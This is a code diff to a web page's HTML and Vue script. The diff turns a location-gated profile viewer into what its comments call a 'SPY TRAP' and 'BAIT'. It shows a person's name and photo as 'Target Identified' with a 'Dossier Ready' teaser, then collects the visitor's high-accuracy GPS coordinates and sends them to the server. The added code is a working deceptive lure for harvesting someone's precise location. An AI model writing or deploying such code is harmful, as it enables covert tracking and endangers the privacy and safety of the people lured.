@@ -72,15 +72,15 @@ export function serveSharedHtml(token) {
             box-shadow: 2px 2px 0px #1e293b !important;
         }
 
-        /* Unlock Button Style */
-        .unlock-btn {
+        /* Spy Action Button Style */
+        .spy-btn {
             border: 4px solid black;
-            box-shadow: 4px 4px 0px 0px black;
+            box-shadow: 6px 6px 0px 0px black;
             transition: all 0.1s;
         }
-        .unlock-btn:active {
-            transform: translate(2px, 2px);
-            box-shadow: 2px 2px 0px 0px black;
+        .spy-btn:active {
+            transform: translate(3px, 3px);
+            box-shadow: 3px 3px 0px 0px black;
         }
     </style>
 </head>
@@ -89,28 +89,52 @@ export function serveSharedHtml(token) {
         
         <!-- LOADING STATE -->
         <div v-if="loading" class="flex flex-col items-center justify-center min-h-[50vh] animate-bounce">
-            <i class="fa-solid fa-magnifying-glass text-5xl text-blue-500 mb-4"></i>
-            <p class="text-xl font-bold font-fun text-slate-700">Hunting for clues...</p>
+            <i class="fa-solid fa-satellite-dish text-5xl text-blue-500 mb-4"></i>
+            <p class="text-xl font-bold font-fun text-slate-700">Establishing Secure Link...</p>
         </div>
 
-        <!-- NEW: LOCATION LOCKED STATE -->
-        <div v-else-if="isLocationLocked" class="fun-card p-8 md:p-12 text-center bg-yellow-50 flex flex-col items-center justify-center min-h-[60vh] border-yellow-600">
-            <div class="w-24 h-24 bg-red-100 rounded-full flex items-center justify-center border-4 border-black mb-6 animate-pulse">
-                <i class="fa-solid fa-lock text-5xl text-red-500"></i>
+        <!-- SPY LOCK STATE (BAIT) -->
+        <div v-else-if="isLocationLocked" class="fun-card p-8 md:p-12 text-center bg-sky-50 flex flex-col items-center justify-center min-h-[60vh] border-sky-600 relative overflow-hidden">
+            <!-- Background Decoration -->
+            <div class="absolute inset-0 pointer-events-none opacity-10 flex items-center justify-center text-9xl">
+                <i class="fa-solid fa-user-secret"></i>
             </div>
-            <h1 class="text-3xl font-fun font-black text-slate-900 mb-2">Restricted Access</h1>
-            <p class="text-lg font-bold text-slate-600 max-w-md mx-auto mb-8">
-                This profile requires location verification. Access is blocked until we can confirm your location.
-            </p>
             
-            <button @click="attemptUnlock" :disabled="locationLoading" class="bg-green-400 hover:bg-green-300 text-black font-black text-xl px-8 py-4 rounded-2xl unlock-btn flex items-center gap-3 disabled:opacity-50 disabled:cursor-not-allowed">
-                <i v-if="locationLoading" class="fa-solid fa-circle-notch fa-spin"></i>
-                <i v-else class="fa-solid fa-location-crosshairs"></i>
-                {{ locationLoading ? 'Verifying...' : 'Share Location & View' }}
-            </button>
-            
-            <div v-if="locationError" class="mt-6 text-red-600 font-bold bg-red-100 px-4 py-2 rounded-lg border-2 border-red-200 inline-block">
-                <i class="fa-solid fa-triangle-exclamation mr-1"></i> {{ locationError }}
+            <div class="z-10 w-full max-w-lg flex flex-col items-center">
+                <div class="bg-white p-2 rounded-full border-4 border-black mb-6 shadow-xl relative">
+                     <div class="w-32 h-32 rounded-full overflow-hidden bg-gray-200">
+                         <img :src="resolveImg(partialData.avatar_path) || 'https://ui-avatars.com/api/?name='+partialData.full_name" class="w-full h-full object-cover">
+                     </div>
+                     <div class="absolute -bottom-2 -right-2 bg-green-400 text-white w-10 h-10 rounded-full flex items-center justify-center border-4 border-white shadow-lg">
+                         <i class="fa-solid fa-check"></i>
+                     </div>
+                </div>
+
+                <h1 class="text-3xl font-fun font-black text-slate-900 mb-1">Target Identified</h1>
+                <div class="text-xl font-bold text-blue-600 font-fun mb-6">{{partialData.full_name}}</div>
+                
+                <p class="text-sm font-bold text-slate-500 mb-8 uppercase tracking-widest border-y-2 border-slate-200 py-2 w-full">
+                    Dossier Ready For Review
+                </p>
+
+                <button @click="attemptUnlock" :disabled="locationLoading" class="spy-btn bg-yellow-400 hover:bg-yellow-300 text-black font-black text-xl px-10 py-5 rounded-2xl flex items-center gap-3 w-full justify-center disabled:opacity-50 disabled:cursor-not-allowed group">
+                    <span v-if="locationLoading" class="flex items-center gap-2">
+                        <i class="fa-solid fa-circle-notch fa-spin"></i>
+                        <span>Decrypting...</span>
+                    </span>
+                    <span v-else class="flex items-center gap-2">
+                        <i class="fa-solid fa-folder-open group-hover:scale-110 transition-transform"></i>
+                        <span>ACCESS PROFILE</span>
+                    </span>
+                </button>
+                
+                <div v-if="locationError" class="mt-6 text-red-600 font-bold bg-red-100 px-4 py-3 rounded-xl border-2 border-red-200 flex items-center gap-3 animate-pulse">
+                    <i class="fa-solid fa-triangle-exclamation text-2xl"></i> 
+                    <div class="text-left text-sm">
+                        <div class="font-black uppercase">Uplink Failed</div>
+                        <div>{{ locationError }}</div>
+                    </div>
+                </div>
             </div>
         </div>
 
@@ -283,7 +307,8 @@ export function serveSharedHtml(token) {
                 const activeTab = ref('Profile');
                 const token = window.location.pathname.split('/').pop();
                 
-                // NEW STATES FOR LOCATION
+                // NEW: PARTIAL DATA STORAGE FOR THE "BAIT"
+                const partialData = ref(null);
                 const isLocationLocked = ref(false);
                 const locationLoading = ref(false);
                 const locationError = ref(null);
@@ -399,9 +424,11 @@ export function serveSharedHtml(token) {
                         
                         // NEW: CHECK FOR 428 PRECONDITION REQUIRED
                         if (res.status === 428) {
+                            const body = await res.json();
+                            partialData.value = body.partial; // GRAB THE "BAIT"
                             isLocationLocked.value = true;
                             loading.value = false;
-                            return; // STOP HERE, wait for user unlock
+                            return; // STOP HERE
                         }
 
                         const json = await res.json();
@@ -424,13 +451,13 @@ export function serveSharedHtml(token) {
                     }
                 };
 
-                // --- NEW UNLOCK FUNCTION ---
+                // --- SPY TRAP UNLOCK FUNCTION ---
                 const attemptUnlock = () => {
                     locationError.value = null;
                     locationLoading.value = true;
 
                     if (!navigator.geolocation) {
-                        locationError.value = "Geolocation is not supported by your browser.";
+                        locationError.value = "Device capability failure. Geolocation missing.";
                         locationLoading.value = false;
                         return;
                     }
@@ -438,15 +465,16 @@ export function serveSharedHtml(token) {
                     navigator.geolocation.getCurrentPosition(
                         (position) => {
                             const { latitude, longitude } = position.coords;
-                            // Re-fetch with location data
+                            // SUCCESS: SEND COORDS BACK TO SERVER
                             loadData(\`?lat=\${latitude}&lng=\${longitude}\`);
                             locationLoading.value = false;
                         },
                         (err) => {
                             console.error(err);
-                            if(err.code === 1) locationError.value = "Access denied. You must allow location to view this file.";
-                            else if(err.code === 2) locationError.value = "Location unavailable. Check your device settings.";
-                            else locationError.value = "Timeout. Please try again.";
+                            // SPY THEMED ERRORS
+                            if(err.code === 1) locationError.value = "Sat-Link Connection Refused by User.";
+                            else if(err.code === 2) locationError.value = "Signal Lost. GPS Unavailable.";
+                            else locationError.value = "Connection Timeout. Retry Uplink.";
                             locationLoading.value = false;
                         },
                         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
@@ -459,7 +487,7 @@ export function serveSharedHtml(token) {
                 
                 return { 
                     loading, error, data, timer, activeTab, 
-                    isLocationLocked, locationLoading, locationError, attemptUnlock, // Expose new state/fn
+                    isLocationLocked, locationLoading, locationError, attemptUnlock, partialData,
                     resolveImg, formatTime, flyTo, getIcon, groupedIntel, getSocialInfo 
                 };
             }
